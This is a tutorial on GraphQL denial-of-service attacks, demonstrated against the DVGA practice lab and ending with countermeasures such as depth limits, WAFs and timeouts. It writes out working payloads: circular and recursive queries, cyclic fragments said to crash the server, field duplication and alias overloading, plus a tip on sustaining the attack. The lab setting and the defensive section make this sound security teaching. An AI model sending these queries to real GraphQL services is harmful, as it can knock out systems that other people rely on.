### Circular queries
Circular queries make it possible to reference data from one type with another type to prevent the duplication of fields in different types. This usually gives a client the chance to make complex queries to the database which in some occasions may make the server return huge responses to the client. In this case, let us assume we have our GraphQL endpoint with the below types:
```graphql
type Country {
	title: String
	capital: String
}
```

In a case where we need to get information about the country's currency, we need to add a field that has the currency of the country, we can do this as shown below
```graphql
type Country{
	title: String
	capital: String
	currency: String
}
```

We can also decouple the currency field to be as shown below
```graphql
type Currency {
	name: String
	code: String
	symbol: String
}
```

At this point, we have two types in the case where we want to find out more about the currnecy of a country, we can restructure our query to look as shown below:
```graphql
type Country {
	title: String
	capital: String
	currency: Currency
}
```

We can now be able to make queries to enquire about a country's currency as shown below
```graphql
type Country {
	title: String
	capital: String
	currency: Currency
}
type Currency {
	name: String
	code: String
	symbol: String
	country: [Country]
}
```
As we can see above, the `Country` type makes it possible to reference the `Currency` type and vice versa which may make it possible for a malicious user to make a recursion by forcing the server's function resolver to loop.
#### Identifying circular relationships
To detect this as an analyst performing a whitebox test, this can be done by reviewing the SDL files, in a black-box test, it becomes a bit difficult to detect this unless the developer has introspection enabled.
We can use a tool like GraphQL voyager to visualize our SDL file and view audit it for circular relationships as shown below
![[Pasted image 20240316121952.png]]
From the diagram below we can see a circular relationship on the `OwnerObject` and the `PasteObject` as there is a bi-directional relationship which may lead to a Denial of Service vulnerability.

We can proceed to send a recursive query to test on recursiveness as shown below
![[Pasted image 20240316130313.png]]
You can expand this query to make it bigger but it can crash your PC so proceed with caution.
#### Circular introspection vulnerabilities
A circular relationship exists in GraphQL's introspection capabilities. The GraphQL documentation provides a schema for the introspection system. We can use the schema in our case to test for circular relationship on DVGA by running the following query.
```graphql
query {
  __schema {
    types {
      fields {
        type {
      fields {
        type {
        fields {
          name
        }
        }
      }
        }
      }
    }
  }
}
```
If this query is performed repeatedly using the repeater your docker container stops running and you have to spin it up again.
#### Circular fragment vulnerabilities
GraphQL shares logic using fragments, fragments gives you the ability to construct sets of fields and then include them in queries when you need to. GraphQL states that fragments should not form any cycles includes spreading itself. Otherwise, an operation could infinitely spread or infinitely execute on cycles in the underlying data, but what happens if we do that? On DVGA, we can create a cycle using a fragment on an Object as shown below
```graphql
query {
	pastes {
	...Begin
	}
}
fragment Begin on PasteObject {
	title
	content
}
```

The response is as shown below
![[Pasted image 20240406110618.png]]
What happens if we create a new fragment and call it `Final` which uses the `Begin` fragment and we have the `Begin` fragment to use the `Final` fragment. This causes an infinite loop which crashes our server almost instantly.
```graphql
query CircularObject {
	pastes {
	...Begin
	}
}
fragment Begin on PasteObject {
	title
	content
  ... Final
}

fragment Final on PasteObject {
  ...Begin
}
```
### Field duplication
Imagine you went to your favorite restaurant and ask for Coffee and a muffin, the waitress will take your order and process it to give you Coffee and a muffin. Let's make it even more detailed there's only one muffin and one can get a maximum of one cup of coffee and you request for the a cup of coffee, a muffin and another muffin. The waiter/waitress will only serve you one muffin because that is all that is there right? 
Let us go back to our GraphQL set up and make a query to retrieve all pastes
```graphql
query{
	pastes{
		title
		content
	}
}
```

Our response is as shown below
![[Pasted image 20240406113632.png]]
What happens if we modify the query as shown below:
```graphql
query{
	pastes{
		title
		content
		content
		content
		content
	}
}
```
We still get one the pastes with only two fields as shown below:
![[Pasted image 20240406113838.png]]
Do you notice the time difference? This shows that the server takes longer to resolve as it has to resolve the all the fields that are in the query at your own time make as many duplicates and do it, you will notice that the request takes longer. To make this attack sustainable in the long run you need to send large payloads continuously.
### Alias overloading
Aliases allow clients to change a field's response key to something else which makes the GraphQL server to treat two servers as different queries. In some instances you may notice that some queries take longer to execute than others such queries may take consume a lot of server resources, on DVGA we have the `systemUpdate` query that takes really long to execute. We can try it below:
```graphql
query {
	systemUpdate
}
```

![[Pasted image 20240406115502.png]]
From the screenshot above, we can see that our query took about 50 seconds to execute, what if we use aliases to refer to the same query as shown below
```graphql
query{
	somealias: systemUpdate
	anotheralias: systemUpdate
	yetanotheralias: systemUpdate
	thelastalias: systemUpdate
}

```
From the screenshot below, you can see that our query takes about 2.25 minutes to execute  as shown below:
![[Pasted image 20240406120836.png]]
#### Aliases + Circular queries
What happens if we pair Alias overloading with circular queries, the query would look like as shown below:
```graphql
query {
	somealias:pastes{
		owner {
			pastes {
				owner {
					name
				}
			}
		}
	}
	anotheralias:pastes{
		owner{
			pastes{
				owner{
					name
				}
			}
		}
	}
	yetanotheralias:pastes{
		owner{
			pastes{
				owner{
					name
				}
			}
		}
	}
	newalias:pastes{
		owner{
			pastes{
				owner{
					name
				}
			}
		}
	}
	anothernewalias:pastes{
		owner{
			pastes{
				owner{
					name
				}
			}
		}
	}
	lastalias:pastes{
		owner{
			pastes{
				owner{
					name
				}
			}
		}
	}
	thelastalias:pastes{
		owner{
			pastes{
				owner{
					name
				}
			}
		}
	}
}
```
This query does not make a huge impact on our services but if we run more queries, we are likely to cause the server to crash
![[Pasted image 20240406121144.png]]
### Auditing DoS attacks
We can use GraphQL cop to check for possible Denial of Service attack vectors, we can use it on DVGA as shown below:
![[Pasted image 20240406123747.png]]
### Denial of Service countermeasures for GraphQL applications
#### Use of a Web Application Firewall
Web Application Firewalls are a common solution in preventing Denial of Service attacks as they use rules and signatures to detect malicious traffic based on specific patterns. This solution has become accepted by the indurstry but does has its own shortcomings as GraphQL is not very popular yet so most firewalls are not GraphQL ready from the get go. In as much as they are not GraphQL ready, "generic" Web Application Firewalls can still identify malicious transactions such as Cross site scripting, Command injections and SQL injections. Web Application Firewalls also play the additional role of preventing DOS attacks by employing body size restrictions and throttling.
#### GraphQL stitching
Stitching is the process of combining multiple schemas to create one schema. Use of stitches can be used to create an API gateway. This will create one point of securing GraphQL APIs as one can enforce policies and perform rate limiting at this single point sustainably.
#### Query depth limits
Circular queries can be prevented by introduction of query depth limits to prevent Denial of Service attacks induced by circular queries. This can be done by setting a maximum depth configuration using the `max_depth` configuration and specifying a number. This method cannot work independently as multiple recursive queries can cause a Denial of Service.
#### Field duplication limits
We can use a middleware security analyzer to inspect the incoming query and either reject the query as a whole or consolidating all the repeated field as one query. This can also be achieved by calculating the height of a query. An application can limit the height of a query by specifying how long the query should be lets take an example below:
```graphql
query{
	pastes{
		owner{
			id
			name
			name
			name
			
		}
	}
}
```
We can limit the height of this query to two to prevent cases of queries exceeding the height of more than two.
#### Limiting number of returned records
This is similar to pagination as one can restrict the maximum of records that can be retrieved using one query on the resolver. Doing this on the server-side prevents the client from overriding the limits that have been set.
#### Implementation of timeouts
When a query takes a long time to execute, it consumes more resources. To mitigate against this, we can intriduce the use of timeouts which states how long requests take to complete. This is mostly done on the web server layer level as not all GraphQL implementations support this. This is a double-edged sword as one can set a short time frame which might affect legitimate users and can be so long which might give leeway for malicious actors. This method should be used with a pinch of salt as it is not the best countermeasure and should not be used independently.